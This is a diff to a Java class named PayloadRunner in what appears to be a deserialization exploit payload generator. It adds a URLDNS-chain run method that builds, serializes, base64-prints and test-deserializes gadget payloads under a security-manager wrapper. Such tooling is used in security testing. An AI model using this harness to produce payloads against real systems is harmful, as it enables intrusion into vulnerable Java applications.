@@ -2,6 +2,7 @@ package com.ppp.secmgr;
 
 import com.ppp.JavaClassHelper;
 import com.ppp.ObjectPayload;
+import com.ppp.chain.urldns.DNSHelper;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.Sink;
@@ -45,6 +46,55 @@ public class PayloadRunner {
 
 
                 final Object objBefore = object.getObject(helper);
+
+                System.out.println("serializing payload");
+                byte[] ser = null;
+                if (objBefore instanceof byte[]) {
+                    ser = (byte[]) objBefore;
+                    System.out.println("Serialized payload is a byte array. " +
+                            "Make sure you have configured a stream handler that can handle it");
+                } else {
+                    ser = Serializer.serialize(objBefore);
+                    String base64 = Serializer.serializeBase64(objBefore);
+                    System.out.println(base64);
+                }
+
+                return ser;
+            }
+        });
+
+        try {
+            System.out.println("deserializing payload");
+            System.out.println("byte length: " + serialized.length);
+            final Object objAfter = Deserializer.deserialize(serialized);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+    }
+
+    /**
+     * URLDNS
+     */
+    public static void run(final Class<? extends ObjectPayload> clazz,final DNSHelper dnsHelper) throws Exception {
+        byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>() {
+            public byte[] call() throws Exception {
+
+                dnsHelper.getHost();
+
+                ObjectPayload<?> object = clazz.newInstance();
+
+                SinksHelper sinksHelper = new SinksHelper();
+                sinksHelper.setSink(clazz.getAnnotation(Sink.class).value()[0]);
+                sinksHelper.setDnsHelper(dnsHelper);
+
+
+                if (sinksHelper.getJavaClassHelper() == null) {
+                    JavaClassHelper javaClassHelper = new JavaClassHelper();
+                    sinksHelper.setJavaClassHelper(javaClassHelper);
+                }
+
+                final Object objBefore = object.getObject(sinksHelper);
 
                 System.out.println("serializing payload");
                 byte[] ser = null;
